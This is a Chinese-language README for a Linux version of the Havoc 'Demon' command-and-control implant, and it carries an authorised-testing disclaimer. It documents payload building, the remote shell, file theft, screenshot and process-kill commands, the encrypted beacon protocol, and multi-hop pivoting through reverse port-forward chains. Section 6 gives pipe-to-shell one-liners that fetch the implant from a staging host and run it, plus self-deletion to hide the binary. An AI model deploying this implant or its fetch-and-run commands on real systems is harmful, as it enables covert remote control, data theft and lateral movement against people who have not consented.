# Demon（Linux 版）

Havoc 0.7 的 Linux agent，用 Go 编写，**协议与 Windows Demon 完全一致**：
同一套 teamserver、同一套 Web/Qt 控制台、同一套 AES-256-CTR 信封。

> 仅用于已获得明确书面授权的安全测试环境。

## 1. 生成载荷

Web 控制台 →「载荷生成」→ 格式选 **Linux Exe** → 选择在线 HTTP(S) 监听器 →
填写休眠/抖动 → 生成，下载 `demon.x64.elf` / `demon.x86.elf`。

teamserver 侧的构建流程（`teamserver/pkg/common/builder/linux.go`）：

1. 把本目录源码复制到 `/tmp/<id>/DemonLinux`；
2. 生成 `config_gen.go`（监听器地址/URI/UA/Header、sleep/jitter、killdate、working hours）；
3. 用本机 Go 工具链静态编译：`GOOS=linux GOARCH=amd64|386 CGO_ENABLED=0 go build -trimpath -ldflags "-s -w"`。

Go 工具链解析顺序：`HAVOC_GO` 环境变量 → `PATH` 中的 `go` → `<repo>/toolchain/go/bin/go`
（当前部署环境使用 `toolchain/` 内置的 Go 1.27.3）。

手工编译（调试用）：

```bash
cd havoc-src/payloads/DemonLinux
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -trimpath -ldflags "-s -w" -o /tmp/demon.elf .
```

`config_gen.go` 里的默认值指向 `127.0.0.1:8080`，仓库内仅供本机联调；
正式载荷的配置始终由 teamserver 生成。

## 2. 已实现的命令

| 命令 | 协议 | 说明 |
| --- | --- | --- |
| `shell <cmd>` / `bash` | `PROC(0x1010)` 子命令 4 | `/bin/sh -c <cmd>`，stdout+stderr 分流回传 |
| `pwd` / `cd` / `ls` / `dir` | `FS(15)` 子命令 9/4/1 | 目录递归、`/starts` `/contains` `/ends` 过滤、日期/大小 |
| `cat` / `type` | `FS` 子命令 10 | 最大 2 MB |
| `download` | `FS` 子命令 2 | 1 MB 分块，`webui/data/loot/<id>/` 落盘 |
| `upload` | `MEM_FILE(2560)` + `FS` 子命令 3 | teamserver 分块上传后落盘 |
| `rm` / `mkdir` / `cp` / `mv` | `FS` 子命令 5/6/7/8 | |
| `proc list` | `PROC_LIST(12)` | 解析 `/proc`，含 PPID/线程数/属主 |
| `proc grep <name>` | `PROC(0x1010)` 子命令 3 | 按进程名子串过滤 |
| `proc kill <pid>` | `PROC` 子命令 7 | `SIGKILL` |
| `proc create` | `PROC` 子命令 4 | 通过 `/bin/sh -c` 启动 |
| `screenshot` | `SCREENSHOT(2510)` | X11 截图（`import` / `grim` / `xwd+convert`），PNG 回传 |
| `socks add <port>` | `SOCKET(2540)` CONNECT/READ/WRITE/CLOSE | teamserver 上开 SOCKS5；agent 负责对目标侧建连与双向转发 |
| `rportfwd add/list/remove/clear` | `SOCKET(2540)` RPORTFWD_* | agent 在目标侧监听，连入后经 teamserver 转发到 FwdAddr:FwdPort |
| `sleep <n> <j>` | `SLEEP(11)` | 立即生效并回包 |
| `checkin` | `CHECKIN(100)` | 重发注册元数据 |
| `exit` | `EXIT(92)` | 发送回执后退出 |

不适用/未实现：注入（DLL/Shellcode/BOF/.NET）、Token、Pivot/SMB、Kerberos、Net、
`proc modules`、`proc memory`、`config` 修改。

### SOCKS / rportfwd 说明

- `socks add 1080`：SOCKS5 服务端跑在 **teamserver**（`0.0.0.0:1080`），每个 CONNECT
  下发 `SOCKET_COMMAND_CONNECT`；agent 建连后回 `[CONNECT][success][id][errno]`，
  数据走 `[READ][id][type=2][1][bytes]` / `[WRITE][id][bytes]`，断开走 `[CLOSE][id]`。
  实测 `curl --socks5-hostname 127.0.0.1:1080 http://127.0.0.1:8081/static/app.js`
  取回 143,322 字节且与源文件一致。
- `rportfwd add <lcladdr> <lclport> <fwdaddr> <fwdport>`：agent 在 `lcladdr:lclport`
  监听；连入后发 `[OPEN][id][lcl][fwd]`，teamserver 连 `fwdaddr:fwdport` 并转发。
  teamserver 侧已**流式化**（2026-11-10）：`PortFwdRead` 分块读取并立即下发
  `SOCKET_COMMAND_WRITE`，`OPEN` 后立即连接目标并启动读循环。因此 SSH banner
  这类“服务端先说话”的协议无需客户端先发数据，HTTP keep-alive 也不再需要
  `Connection: close`（agent 已恢复默认 keep-alive）。
- `sleep 0` 时 agent 以 250ms 轮询，SOCKS/rportfwd 延迟可接受。收到这些命令时回
`COMMAND_ERROR(ERROR_OS=4)` + 文本，控制台会直接显示「command 0x… is not supported…」。

> Web 控制台还有一层 `linux_compat.py`：把 `whoami/env/ipconfig/netstat/arp/...`
> 这类客户端 BOF 模块命令改写为 Linux 原生命令（`id`、`ip`、`ss`…），
> 并在 `help` 中把无等价实现的命令标注为「仅 Windows」。
> **Qt 客户端同样可用**：teamserver 在 `TaskPrepare` 里对 Linux 会话做了同样的改写
> （`pkg/agent/linux_compat.go`），因此 Qt 直接发送 BOF 的 `whoami`/`tasklist`/
> `net users` 等也会执行 Linux 原生命令。

## 3. 协议要点（与 C Demon 对照）

```
请求（agent → teamserver，整数大端）
  [ size ][ 0xDEADBEEF ][ agentID ][ 第一组 command/requestID ][ AES-CTR(其余) ]

注册（DEMON_INIT=99）
  [ size ][ magic ][ agentID ][99][0][AES key 32B 明文][AES IV 16B 明文][AES-CTR(元数据)]

元数据（大端）
  agentID, hostname, username, domain, internalIP,
  wstring 进程路径, pid, tid, ppid, 进程架构, elevated, baseAddress,
  osVersion[5], osArch, sleep, jitter, killDate(int64), workingHours,
  [+ Linux 扩展] platform=2, osName(string)

响应（teamserver → agent，整数小端，逐包独立 CTR）
  [ command ][ requestID ][ size ][ AES-CTR(payload) ] * N
```

Linux 扩展是**尾部可选字段**，Windows Demon 不发送，teamserver 用
`Parser.Length() >= 4` 判断，保持向后兼容；解析后会话列表显示
`Linux Kali GNU/Linux Rolling` 这类系统名，`Platform` 字段为 `linux`。

## 4. 与 Windows Demon 的差异

| 项目 | Windows Demon | Linux Demon |
| --- | --- | --- |
| 语言/构建 | C + mingw + nasm | Go（静态、无依赖） |
| 体积 | ~100 KB | ~6 MB（可 `-ldflags "-s -w"`，暂未做 UPX） |
| 休眠混淆 | Ekko/Foliage/Zilean | 无（仅 sleep/jitter） |
| 注入/BOF/.NET | 支持 | 不支持 |
| 代理 | WinHTTP + 系统代理 | 监听器 Proxy 配置（烘焙）→ 否则 `http.ProxyFromEnvironment` |
| 截图 | GDI/BitBlt | `import`/`grim`/`xwd+convert`（X11/Wayland） |
| 进程信息 | PEB/API | `/proc` |

## 5. 监听器兼容性

| 监听器 | 支持 | 说明 |
| --- | --- | --- |
| HTTP | ✅ | 直接回连 |
| HTTPS | ✅ | 跳过自签名证书校验 |
| SMB pivot | ❌ | 依赖 Windows 命名管道，Linux 无等价物 |
| External | ❌ | 第三方 Agent 端点，不生成 Demon 载荷 |
| tcp/kcp/udp/ws/dns/doh/dot/oss | ✅ | 中继器 + 带 `127.0.0.1:1080` 代理的 HTTP 监听器；代理配置由 teamserver 写入 `config_gen.go` |

## 6. 一键上线（/slt）

`payloads-out/` 放入 `demon.x64.elf` / `demon.x86.elf` 后，9901 暂存服务提供：

```sh
curl -fsSL http://<暂存地址>/slt | sh
```

脚本按 `uname -m` 选架构、curl/wget 下载、chmod、setsid 脱离当前 shell；
启动时设置 `DEMON_SELF_DELETE=1`，Demon 启动后删除自身，脚本另有 3 秒延时 `rm` 兜底
（避免在 exec 之前删除导致 ENOENT 的竞态）。
已上线的主机可直接用会话 shell 二次投递：

```
shell curl -fsSL http://192.168.121.132:9901/slt | sh
```

Web/Qt 的「一键上线命令」面板都会生成这条命令；`/health` 的 `linux_payloads` 列出可用架构。

## 7. 多层跳板（rportfwd 链）

Havoc 的 SMB pivot 是 Windows 命名管道专用；Linux 用 **rportfwd + 分层回调**实现多级 C2：

```
host3 (C) --HTTP--> host2:B:18090 --(B 的 C2)--> host1:A:18080 --(A 的 C2)--> teamserver:8080
        rportfwd 隧道          rportfwd 隧道            直连/上一层隧道
```

每一层做两件事：

1. 在已上线会话上开一个反向端口（指向最终 teamserver 监听器）：
   `rportfwd add 0.0.0.0 18080 127.0.0.1 8080`
2. 用「Hosts=上一层可达地址、PortConn=该反向端口」的 HTTP 监听器生成载荷，
   投递到下一层主机执行；载荷的回连就是上一层隧道。

要点：

- 隧道落点是**最终 teamserver 的 HTTP 监听器**，因此 Hop 监听器的
  `UserAgent/Headers/Uris` 必须与最终监听器一致（否则被 fake404/header 校验拒绝）；
- 每层 `rportfwd` 绑定地址要能被下一层访问（0.0.0.0 或具体网卡）；
- rportfwd 已流式化：agent 保持 HTTP keep-alive（不再强制 `Connection: close`），
  `OPEN` 后 teamserver 立即连目标并启动读循环，SSH banner 等协议可立即收到数据；
- teamserver 重启后会从 DB 恢复 Hop 监听器的 `PortConn`，多跳链不会退化成直连 `PortBind`；
- 延迟 ≈ 各层 sleep 之和，交互场景建议 `sleep 0`（250ms 轮询）；sleep 0 下三层单命令往返约 1–2s；
- 会话表显示最终落点监听器（多跳会话通常是 `LAN-Test`），会话图（PivotParent）
  仍只认 SMB pivot，Linux 的 rportfwd 链不会画成父子节点。

本机 3 层实测（2026-11-10 收尾，同一主机 3 个独立进程模拟 3 台主机）：

| 层 | 会话 | 回调 | 结果 |
| --- | --- | --- | --- |
| A | `4c0b4946` | 192.168.121.132:8080（直连） | healthy |
| B | `0ea33e9a` | 127.0.0.1:18080（A 的 rportfwd） | healthy，`shell id -un` 正常 |
| C | `4bcf295f` | 127.0.0.1:18090（B 的 rportfwd） | healthy，`shell id -un; hostname` 输出 `kali/bogon` |

## 8. 本机联调

```bash
# 1. 生成并下载（Web 控制台）后
chmod +x demon.x64.elf
./demon.x64.elf &

# 2. 验证（Web 控制台）
#    会话表出现 <host>/<user>，系统列显示 Linux …；控制台执行 shell id
```

2026-11-10 本机实测：x64/x86 各生成一次，注册、心跳、shell、pwd/ls/cat、
download/upload、proc list/grep/kill、checkin、sleep、截图全部通过；
HTTPS 监听器、TCP/WS 传输中继各上线一次；Windows 载荷构建与既有 Web 验收脚本无回归。
